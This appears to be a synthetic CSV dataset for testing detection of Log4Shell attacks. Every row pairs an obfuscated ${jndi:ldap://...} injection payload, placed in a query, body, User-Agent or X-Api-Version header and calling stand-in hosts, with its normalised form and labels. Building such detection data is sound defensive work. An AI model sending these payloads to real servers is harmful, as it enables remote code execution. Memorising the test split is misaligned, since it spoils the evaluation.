id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000162,2026-05-17,synthetic,GET /search?q=${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldap://evil.example/unicode} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,unicode_escape,path,unseen_obfuscation_test,critical
LS-000163,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/unicode},1,log4shell,unicode_escape,body,unseen_obfuscation_test,critical
LS-000164,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode} HTTP/1.1,get /?q=${jndi:ldap://evil.example/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-000165,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-000166,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://evil.example/unicode} | method: get | host: app.local | path: /home,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-000167,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode},request from user-agent: ${jndi:ldap://evil.example/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-000168,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://evil.example/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-000169,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep} HTTP/1.1,get /?q=${jndi:ldap://evil.example/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000170,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000171,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://evil.example/sep} | method: get | host: app.local | path: /home,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000172,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep},request from user-agent: ${jndi:ldap://evil.example/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000173,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://evil.example/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000174,2026-05-17,synthetic,GET /search?q=${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:ldap://evil.example/sep} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000175,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000176,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep} HTTP/1.1,get /?q=${jndi:ldap://evil.example/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000177,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000178,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://evil.example/sep} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000179,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep},request from user-agent: ${jndi:ldap://evil.example/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000180,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://evil.example/sep},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://evil.example/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000289,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000290,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000291,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://attacker.evil.com/nested} | method: get | host: app.local | path: /metrics,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000292,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested},request from user-agent: ${jndi:ldap://attacker.evil.com/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000293,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://attacker.evil.com/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000294,2026-05-17,synthetic,GET /search?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:ldap://attacker.evil.com/nested} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000295,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/nested},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000296,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000297,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000298,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://attacker.evil.com/nested} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000299,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested},request from user-agent: ${jndi:ldap://attacker.evil.com/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000300,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.evil.com/nested},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://attacker.evil.com/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000301,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000302,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000303,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://attacker.evil.com/lower} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000304,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower},request from user-agent: ${jndi:ldap://attacker.evil.com/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000305,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://attacker.evil.com/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000306,2026-05-17,synthetic,GET /search?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://attacker.evil.com/lower} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000307,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/lower},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000308,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000309,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000310,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://attacker.evil.com/lower} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000311,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower},request from user-agent: ${jndi:ldap://attacker.evil.com/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000312,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.evil.com/lower},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://attacker.evil.com/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000313,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000314,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000315,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://attacker.evil.com/upper} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000316,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper},request from user-agent: ${jndi:ldap://attacker.evil.com/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000317,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://attacker.evil.com/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000318,2026-05-17,synthetic,GET /search?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://attacker.evil.com/upper} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000319,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/upper},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000320,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000321,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000322,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://attacker.evil.com/upper} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000323,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper},request from user-agent: ${jndi:ldap://attacker.evil.com/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000324,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.evil.com/upper},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://attacker.evil.com/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
